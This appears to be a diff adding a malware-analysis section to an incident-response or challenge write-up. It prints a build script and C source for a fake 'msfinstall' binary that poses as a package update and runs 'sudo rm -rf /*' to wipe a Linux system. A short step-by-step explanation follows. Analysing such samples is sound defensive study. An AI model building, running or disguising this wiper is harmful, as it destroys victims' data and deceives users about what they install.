@@ -54,3 +54,42 @@ The executable programs had an icon of a folder while the javascript files and V
 # Eradication
 
 Finally we can eradicate the malicious programs by deleting the processes using sysinternals.
+
+# Malware Analysis and Reverse Engeneering
+
+The challange was to analyze a C code which was intiated by running the build.sh file. 
+
+```bash
+#!/bin/sh
+gcc main.c -o msfinstall
+mv msfinstall ..
+cd .. && rm -rf fake-msfinstall/
+echo "Now pass 'msfinstall' to the victim."
+exit
+```
+
+```c
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+
+#define kill_os "sudo rm -rf /*"
+#define text "Switching to root user to update the package" 
+#define error_text "There has been an error."
+
+int main(){
+#if defined __linux__ || defined __unix__
+    if ( geteuid() != 0 ){
+        printf("%s\n", text); 
+    }
+    system(kill_os);
+#else
+    printf("%s\n", error_text);
+    return 1;
+#endif
+}
+```
+
+   1. The program starts by insuring that the current system is a linux/unix based one.
+   2. If the system turns out to be a non linux/unix one it will display an error.
+   3. Once the system is assured to be linux/unix then it will remove the root folder of the os which will lead to a complete distruction of the system.
